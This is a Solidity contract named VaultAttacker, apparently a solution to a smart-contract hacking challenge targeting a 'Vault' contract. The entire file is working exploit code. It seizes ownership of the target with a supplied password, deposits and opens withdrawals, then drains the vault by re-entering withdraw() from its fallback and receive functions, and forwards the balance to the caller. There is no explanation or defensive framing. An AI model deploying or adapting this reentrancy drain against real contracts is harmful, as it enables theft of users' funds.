// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./Vault.sol";

contract VaultAttacker is Ownable {
  address attackTarget;
  constructor(address _attackTarget) Ownable(msg.sender) {
    attackTarget = _attackTarget;
  }

  function getMoneyAttack(bytes32 _password) public payable {
    changeOwner(_password);
    deposit();
    openWithdraw();
    withdraw();
    (bool success, ) = address(msg.sender).call{value: address(this).balance}("");
    require(success, "Attack failed.");
  }

  function changeOwner(bytes32 _password) private {
    bytes memory changeOwnerData = abi.encodeWithSignature("changeOwner(bytes32,address)", _password, address(this));
    (bool success, ) = address(attackTarget).call(changeOwnerData);
    require(success, "changeOwner call failed");
  }
  function deposit() private {
    bytes memory depositeData = abi.encodeWithSignature("deposite()");
    (bool s, ) = address(attackTarget).call{value: msg.value}(depositeData);
    require(s, "deposite call failed");
  }

  function withdraw() private {
    bytes memory withdrawData = abi.encodeWithSignature("withdraw()");
    (bool s2, ) = address(attackTarget).call(withdrawData);
    require(s2, "withdraw call failed");
  }
  function openWithdraw() private {
    bytes memory openWithdrawData = abi.encodeWithSignature("openWithdraw()");
    (bool s1, ) = address(attackTarget).call(openWithdrawData);
    require(s1, "openWithdraw call failed");
  }

  fallback() external payable {
    withdraw();
  }
  receive() external payable {
    withdraw();
  }
}